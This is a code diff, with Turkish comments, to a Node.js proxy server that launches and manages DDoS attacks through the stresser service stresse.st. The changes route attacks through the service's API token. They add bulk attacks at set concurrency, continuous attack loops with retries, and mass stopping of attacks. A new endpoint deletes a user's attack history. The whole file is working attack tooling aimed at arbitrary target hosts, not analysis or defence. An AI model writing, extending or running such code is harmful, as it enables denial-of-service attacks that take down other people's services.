@@ -300,6 +300,35 @@ function buildTargetUrl(host, port) {
   return port ? `${cleanHost}:${port}` : cleanHost;
 }
 
+function buildApiUrl(apiToken, params) {
+  const isL7 = params.layer === 'L7';
+  let host = isL7 ? normalizeUrl(params.host) : normalizeHost(params.host);
+  // L7 host'ta http:// veya https:// var, API URL'de host olarak geçmeli
+  if (isL7 && host.startsWith('https://')) {
+    host = host.replace('https://', '');
+  } else if (isL7 && host.startsWith('http://')) {
+    host = host.replace('http://', '');
+  }
+  // L7 geo suffix .txt olmali
+  const geo = isL7 ? `${params.geo || 'russia'}.txt` : (params.geo || 'russia');
+  return `https://stresse.st/api?key=${encodeURIComponent(apiToken)}&host=${encodeURIComponent(host)}&port=${params.port}&time=${params.time}&method=${encodeURIComponent(params.method)}&conc=${params.concurrents || 1}&geo=${encodeURIComponent(geo)}`;
+}
+
+async function startAttackApi(apiClient, params) {
+  const url = buildApiUrl(params.apiToken, params);
+  const res = await apiClient.get(url);
+  if (res.data?.status === 'error') {
+    throw new Error(res.data.message || 'API attack failed');
+  }
+  return res.data;
+}
+
+async function stopAttackApi(apiClient, apiToken, attackId) {
+  const url = `https://stresse.st/stop?id=${encodeURIComponent(attackId)}&key=${encodeURIComponent(apiToken)}`;
+  const res = await apiClient.get(url);
+  return res.data;
+}
+
 function registerAttack(attackId, sessionId, params, loopId = null) {
   if (!attackId || !sessionId) return;
   activeAttacks[attackId] = {
@@ -568,6 +597,25 @@ function getClient(sessionId) {
   }));
 }
 
+function getApiClient(sessionId) {
+  const session = sessions[sessionId];
+  if (!session || !session.apiToken) {
+    const err = new Error('API token not available');
+    err.statusCode = 401;
+    throw err;
+  }
+  return axios.create({
+    baseURL: 'https://stresse.st',
+    family: 4,
+    maxRedirects: 5,
+    timeout: 45000,
+    headers: {
+      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+      'Accept': 'application/json, text/plain, */*'
+    }
+  });
+}
+
 // =====================
 // stresse.st PROXY
 // =====================
@@ -645,9 +693,23 @@ app.post('/api/stresse/login', async (req, res) => {
         console.warn(`[login] Plan alinamadi: ${planErr.message}`);
       }
 
+      // 5. Fetch API token for direct API usage
+      step = 'GET /getApiToken';
+      let apiToken = null;
+      try {
+        const tokenRes = await client.get('/getApiToken');
+        apiToken = tokenRes.data?.apitoken || null;
+        if (apiToken) {
+          console.log(`[login] API token alindi: ${apiToken.slice(0, 8)}...`);
+        }
+      } catch (tokenErr) {
+        console.warn(`[login] API token alinamadi: ${tokenErr.message}`);
+      }
+
       sessions[sessionId].username = vcookieRes.data.username || username;
       sessions[sessionId].user = vcookieRes.data;
       sessions[sessionId].plan = planData;
+      sessions[sessionId].apiToken = apiToken;
       saveState();
 
       res.json({
@@ -818,46 +880,33 @@ app.post('/api/stresse/attack', async (req, res) => {
       return res.status(403).json({ status: 'error', message: planCheck.message });
     }
 
-    const client = getClient(sessionId);
-
-    // Fetch CSRF token first
-    const csrfRes = await client.get('/csrf-token');
-    const csrfToken = csrfRes.data.csrfToken;
-
-    const response = await client.post('/attack', {
-      host,
-      port: parseInt(port),
-      time: time.toString(),
-      method,
-      subnet,
-      geo
-    }, {
-      headers: {
-        'Content-Type': 'application/json',
-        'X-CSRF-Token': csrfToken
-      }
-    });
-
-    // stresse.st bazen 200 OK ile { status: 'error', message: '...' } dondurebilir
-    if (response.data && response.data.status === 'error') {
-      return res.status(400).json({
-        status: 'error',
-        message: response.data.message || 'Saldiri baslatilamadi',
-        data: response.data
-      });
+    const session = sessions[sessionId];
+    if (!session || !session.apiToken) {
+      return res.status(401).json({ status: 'error', message: 'API token not available, please login again' });
     }
 
-    // Basarili tek saldiriyi kaydet ki restart sonrasi gorulebilsin
-    const attackId = response.data?.id || response.data?.attack_id;
+    const apiClient = getApiClient(sessionId);
+    const data = await startAttackApi(apiClient, {
+      apiToken: session.apiToken,
+      host,
+      port: parseInt(port),
+      time: parseInt(time),
+      method,
+      geo,
+      layer,
+      concurrents: 1
+    });
+
+    const attackId = data?.id || data?.attack_id;
     if (attackId) {
-      registerAttack(attackId, sessionId, { host, port, method, time });
+      registerAttack(attackId, sessionId, { host, port: parseInt(port), method, time });
       addAttackHistory(sessionId, { host, port, method, time }, {
         concurrents: 1,
         attackIds: [attackId]
       });
     }
 
-    res.json(response.data);
+    res.json(data);
   } catch (error) {
     handleEndpointError(res, error, 'Attack error');
   }
@@ -865,9 +914,9 @@ app.post('/api/stresse/attack', async (req, res) => {
 
 /**
  * POST /api/stresse/attack/bulk
- * Body: { host, port, time, method, subnet, geo, concurrents }
+ * Body: { host, port, time, method, subnet, geo, concurrents, layer }
  *
- * Ayni hedefe concurrents kadar paralel saldiri baslatir.
+ * API key ile tek istekte concurrents kadar saldiri baslatir.
  */
 app.post('/api/stresse/attack/bulk', async (req, res) => {
   try {
@@ -897,64 +946,54 @@ app.post('/api/stresse/attack/bulk', async (req, res) => {
       return res.status(403).json({ status: 'error', message: planCheck.message });
     }
 
-    const client = getClient(sessionId);
+    const session = sessions[sessionId];
+    if (!session || !session.apiToken) {
+      return res.status(401).json({ status: 'error', message: 'API token not available, please login again' });
+    }
 
-    // Tek CSRF token ile tum istekleri gonder
-    const csrfRes = await client.get('/csrf-token');
-    const csrfToken = csrfRes.data.csrfToken;
-
-    const attackPayload = {
+    const apiClient = getApiClient(sessionId);
+    const data = await startAttackApi(apiClient, {
+      apiToken: session.apiToken,
       host,
       port: parseInt(port),
-      time: time.toString(),
+      time: parseInt(time),
       method,
-      subnet,
-      geo
-    };
-    const attackHeaders = {
-      'Content-Type': 'application/json',
-      'X-CSRF-Token': csrfToken
-    };
-
-    const results = await Promise.all(
-      Array.from({ length: count }, () =>
-        client.post('/attack', attackPayload, { headers: attackHeaders })
-          .then((r) => ({ status: 'success', data: r.data }))
-          .catch((err) => ({ status: 'error', message: err.message, data: err.response?.data }))
-      )
-    );
-
-    const successResults = results.filter((r) => r.status === 'success' && !(r.data?.status === 'error'));
-    const failResults = results.filter((r) => r.status === 'error' || r.data?.status === 'error');
-
-    console.log(`[attack/bulk] ${host}:${port} ${method} x${count} -> ${successResults.length} success, ${failResults.length} fail`);
-
-    // Basarili bulk saldirilarin ID'lerini kaydet
-    const bulkAttackIds = [];
-    successResults.forEach((r) => {
-      const attackId = r.data?.id || r.data?.attack_id;
-      if (attackId) {
-        registerAttack(attackId, sessionId, { host, port, method, time });
-        bulkAttackIds.push(attackId);
-      }
+      geo,
+      layer,
+      concurrents: count
     });
 
-    if (bulkAttackIds.length > 0) {
+    console.log(`[attack/bulk] ${host}:${port} ${method} x${count} -> API response:`, JSON.stringify(data).slice(0, 200));
+
+    // API { attack_id: [id1, id2, ...] } veya { id: ... } dondurebilir
+    let attackIds = [];
+    if (Array.isArray(data?.attack_id)) {
+      attackIds = data.attack_id;
+    } else if (data?.attack_id) {
+      attackIds = [data.attack_id];
+    } else if (data?.id) {
+      attackIds = [data.id];
+    }
+
+    attackIds.forEach((attackId) => {
+      registerAttack(attackId, sessionId, { host, port: parseInt(port), method, time });
+    });
+
+    if (attackIds.length > 0) {
       addAttackHistory(sessionId, { host, port, method, time }, {
         concurrents: count,
-        attackIds: bulkAttackIds
+        attackIds
       });
     }
 
     res.json({
       status: 'success',
       total: count,
-      successCount: successResults.length,
-      failCount: failResults.length,
-      results,
-      // Tek saldiriyla uyumlu donus icin ilk basarili ID
-      id: successResults[0]?.data?.id || successResults[0]?.data?.attack_id || null,
-      attack_id: successResults[0]?.data?.id || successResults[0]?.data?.attack_id || null
+      successCount: attackIds.length,
+      failCount: count - attackIds.length,
+      data,
+      id: attackIds[0] || null,
+      attack_id: attackIds[0] || null
     });
   } catch (error) {
     handleEndpointError(res, error, 'Bulk attack error');
@@ -1041,83 +1080,87 @@ async function runLoopRound(loopId) {
   const loop = activeLoops[loopId];
   if (!loop || !loop.running) return;
 
-  const client = getClient(loop.sessionId);
-  let csrfToken = await fetchCsrfToken(client, loopId);
-  if (!csrfToken) {
-    loop.errors += 1;
-    console.error(`[loop ${loopId}] CSRF token alinamadi, tur atlandi`);
+  const session = sessions[loop.sessionId];
+  if (!session || !session.apiToken) {
+    console.error(`[loop ${loopId}] API token bulunamadi, loop durduruluyor`);
+    loop.running = false;
     saveState();
     return;
+  }
+
+  const apiClient = getApiClient(loop.sessionId);
+
+  // Yeni tur baslamadan once onceki turun saldirilarini durdur ki
+  // stresse.st concurrent limiti asilmasin.
+  const previousRoundIds = loop.roundAttackIds || [];
+  if (previousRoundIds.length > 0) {
+    console.log(`[loop ${loopId}] Onceki turun ${previousRoundIds.length} saldirisi durduruluyor`);
+    for (const attackId of previousRoundIds) {
+      try {
+        await stopAttackApi(apiClient, session.apiToken, attackId);
+        unregisterAttack(attackId);
+      } catch (err) {
+        console.warn(`[loop ${loopId}] Eski saldiri ${attackId} durdurulamadi:`, err.message);
+      }
+    }
   }
 
   loop.roundCount += 1;
   loop.lastRoundAt = new Date().toISOString();
   const round = loop.roundCount;
 
-  // Her 5 turda bir CSRF token'i tazeleyelim
-  if (round % 5 === 0) {
-    const freshToken = await fetchCsrfToken(client, loopId);
-    if (freshToken) csrfToken = freshToken;
-  }
-
-  const attackPayload = {
-    host: loop.params.layer === 'L7' ? normalizeUrl(loop.params.host) : normalizeHost(loop.params.host),
-    port: loop.params.port,
-    time: loop.params.time.toString(),
-    method: loop.params.method,
-    subnet: loop.params.subnet,
-    geo: loop.params.geo
-  };
-  const attackHeaders = {
-    'Content-Type': 'application/json',
-    'X-CSRF-Token': csrfToken
-  };
-
-  // Her yeni turda once onceki tur ID'lerini temizle
+  // Yeni tur ID'lerini temizle
   loop.roundAttackIds = [];
 
-  // Concurrent'lari ayni anda gonder; basarisiz olanlari retry et
   let roundSuccesses = 0;
-  const roundAttacks = [];
-  for (let c = 0; c < loop.params.concurrents; c++) {
-    roundAttacks.push(
-      (async () => {
-        for (let attempt = 0; attempt <= MAX_REQUEST_RETRIES; attempt++) {
-          try {
-            const res = await client.post('/attack', attackPayload, { headers: attackHeaders });
-            const attackId = res.data?.id || res.data?.attack_id;
-            if (attackId) {
-              loop.roundAttackIds.push(attackId);
-              roundSuccesses++;
-              // Loop attack'lerini de normal saldirilar gibi kaydet ki restart sonrasi gorunsun
-              registerAttack(attackId, loop.sessionId, loop.params, loopId);
-              return res;
-            }
-            // Basarili HTTP ama attackId yoksa retry etme, direkt hata say
-            loop.errors += 1;
-            console.warn(`[loop ${loopId}] round ${round} concurrent ${c + 1} attackId donmedi`);
-            return res;
-          } catch (err) {
-            if (attempt === MAX_REQUEST_RETRIES) {
-              loop.errors += 1;
-              console.error(`[loop ${loopId}] round ${round} concurrent ${c + 1} hata (${MAX_REQUEST_RETRIES} retry):`, err.message);
-              return null;
-            }
-            // Exponential backoff: 500ms, 1000ms, 1500ms
-            await new Promise(r => setTimeout(r, 500 * (attempt + 1)));
-          }
-        }
-      })()
-    );
-  }
-  await Promise.all(roundAttacks);
+  let roundError = null;
 
-  // Her loop'un kendi ardisik hata sayacini takip et (roundlar arasi kalici)
-  if (!loop.consecutiveErrors) loop.consecutiveErrors = 0;
+  for (let attempt = 0; attempt <= MAX_REQUEST_RETRIES; attempt++) {
+    try {
+      const data = await startAttackApi(apiClient, {
+        apiToken: session.apiToken,
+        host: loop.params.host,
+        port: loop.params.port,
+        time: loop.params.time,
+        method: loop.params.method,
+        geo: loop.params.geo,
+        layer: loop.params.layer,
+        concurrents: loop.params.concurrents
+      });
+
+      let attackIds = [];
+      if (Array.isArray(data?.attack_id)) {
+        attackIds = data.attack_id;
+      } else if (data?.attack_id) {
+        attackIds = [data.attack_id];
+      } else if (data?.id) {
+        attackIds = [data.id];
+      }
+
+      if (attackIds.length > 0) {
+        roundSuccesses = attackIds.length;
+        loop.roundAttackIds = attackIds;
+        attackIds.forEach((attackId) => {
+          registerAttack(attackId, loop.sessionId, loop.params, loopId);
+        });
+        console.log(`[loop ${loopId}] round ${round} basarili: ${attackIds.length} saldiri`);
+        break;
+      }
+
+      roundError = new Error('API attackId donmedi');
+    } catch (err) {
+      roundError = err;
+      console.warn(`[loop ${loopId}] round ${round} deneme ${attempt + 1}/${MAX_REQUEST_RETRIES + 1} hata:`, err.message);
+      if (attempt < MAX_REQUEST_RETRIES) {
+        await new Promise(r => setTimeout(r, 500 * (attempt + 1)));
+      }
+    }
+  }
 
   if (roundSuccesses === 0) {
-    loop.consecutiveErrors++;
-    console.warn(`[loop ${loopId}] round ${round} tamamen basarisiz (${loop.consecutiveErrors}/${MAX_LOOP_CONSECUTIVE_ERRORS})`);
+    loop.errors += 1;
+    loop.consecutiveErrors = (loop.consecutiveErrors || 0) + 1;
+    console.error(`[loop ${loopId}] round ${round} tamamen basarisiz (${loop.consecutiveErrors}/${MAX_LOOP_CONSECUTIVE_ERRORS}): ${roundError?.message}`);
     if (loop.consecutiveErrors >= MAX_LOOP_CONSECUTIVE_ERRORS) {
       console.error(`[loop ${loopId}] Cok fazla hata, loop otomatik durduruluyor`);
       loop.running = false;
@@ -1222,7 +1265,6 @@ app.post('/api/stresse/loop', async (req, res) => {
 /**
  * POST /api/stresse/stop
  * Body: { id }
- * Not: stresse.st /stop endpoint'i CSRF token istemez.
  */
 app.post('/api/stresse/stop', async (req, res) => {
   try {
@@ -1243,12 +1285,13 @@ app.post('/api/stresse/stop', async (req, res) => {
     });
     saveState();
 
-    const client = getClient(sessionId);
-    // CSRF token gonderilirse stresse.st "Attack not found" donuyor
-    const response = await client.post('/stop', { id }, {
-      headers: { 'Content-Type': 'application/json' },
-      timeout: 60000
-    });
+    const session = sessions[sessionId];
+    if (!session || !session.apiToken) {
+      return res.status(401).json({ status: 'error', message: 'API token not available, please login again' });
+    }
+
+    const apiClient = getApiClient(sessionId);
+    const response = await stopAttackApi(apiClient, session.apiToken, id);
 
     // Durdurulan saldiriyi kayittan sil
     const attackRecord = activeAttacks[id];
@@ -1272,7 +1315,7 @@ app.post('/api/stresse/stop', async (req, res) => {
       }
     }
 
-    res.json(response.data);
+    res.json(response);
   } catch (error) {
     handleEndpointError(res, error, 'Stop error');
   }
@@ -1281,9 +1324,8 @@ app.post('/api/stresse/stop', async (req, res) => {
 /**
  * POST /api/stresse/stop/bulk
  * Body: { ids: [id1, id2, ...], batchSize?: number, delayMs?: number, concurrency?: number }
- * Not: stresse.st /stop endpoint'i CSRF token istemez.
  *
- * ID'leri kucuk gruplara ayirir; her grup icindeki istekleri
+ * API key ile ID'leri kucuk gruplara ayirir; her grup icindeki istekleri
  * sinirli concurrency ile paralel atar. Bu sayede cok sayida
  * saldiriyi hizli ve rate limit riskini azaltarak durdurur.
  */
@@ -1297,22 +1339,23 @@ app.post('/api/stresse/stop/bulk', async (req, res) => {
       return res.status(400).json({ status: 'error', message: 'ids array required' });
     }
 
+    const session = sessions[sessionId];
+    if (!session || !session.apiToken) {
+      return res.status(401).json({ status: 'error', message: 'API token not available, please login again' });
+    }
+
     const size = Math.max(1, Math.min(parseInt(batchSize) || 10, 20));
     const delay = Math.max(0, Math.min(parseInt(delayMs) || 500, 5000));
     const concurrent = Math.max(1, Math.min(parseInt(concurrency) || 5, 10));
 
-    const client = getClient(sessionId);
+    const apiClient = getApiClient(sessionId);
     const results = [];
     const totalBatches = Math.ceil(ids.length / size);
 
     const stopSingle = async (id) => {
       try {
-        // CSRF token gonderilirse stresse.st "Attack not found" donuyor
-        const response = await client.post('/stop', { id }, {
-          headers: { 'Content-Type': 'application/json' },
-          timeout: 60000
-        });
-        return { id, status: 'success', data: response.data };
+        const response = await stopAttackApi(apiClient, session.apiToken, id);
+        return { id, status: 'success', data: response };
       } catch (err) {
         return { id, status: 'error', message: err.message, data: err.response?.data };
       }
@@ -1471,6 +1514,52 @@ app.get('/api/stresse/history/:username', async (req, res) => {
     res.json({ status: 'success', count: records.length, records });
   } catch (error) {
     handleEndpointError(res, error, 'History fetch error');
+  }
+});
+
+/**
+ * DELETE /api/stresse/history
+ * Body: { ids?: string[], all?: boolean }
+ *
+ * Kullanicinin saldiri gecmisini toplu olarak siler.
+ */
+app.delete('/api/stresse/history', async (req, res) => {
+  try {
+    const sessionId = req.headers['sessionid'] || req.headers['sessionId'];
+    if (!sessionId) return res.status(401).json({ status: 'error', message: 'Session required' });
+
+    const sessionUser = sessions[sessionId]?.username;
+    if (!sessionUser) {
+      return res.status(401).json({ status: 'error', message: 'Session user not found' });
+    }
+
+    const { ids, all = false } = req.body;
+    let removed = 0;
+
+    if (all === true) {
+      Object.keys(attackHistory).forEach((historyId) => {
+        if (attackHistory[historyId].username === sessionUser) {
+          delete attackHistory[historyId];
+          removed++;
+        }
+      });
+    } else if (Array.isArray(ids) && ids.length > 0) {
+      ids.forEach((historyId) => {
+        const record = attackHistory[historyId];
+        if (record && record.username === sessionUser) {
+          delete attackHistory[historyId];
+          removed++;
+        }
+      });
+    } else {
+      return res.status(400).json({ status: 'error', message: 'ids array or all:true required' });
+    }
+
+    saveState();
+    console.log(`[history] ${sessionUser} icin ${removed} gecmis kaydi silindi`);
+    res.json({ status: 'success', removed });
+  } catch (error) {
+    handleEndpointError(res, error, 'History delete error');
   }
 });
 
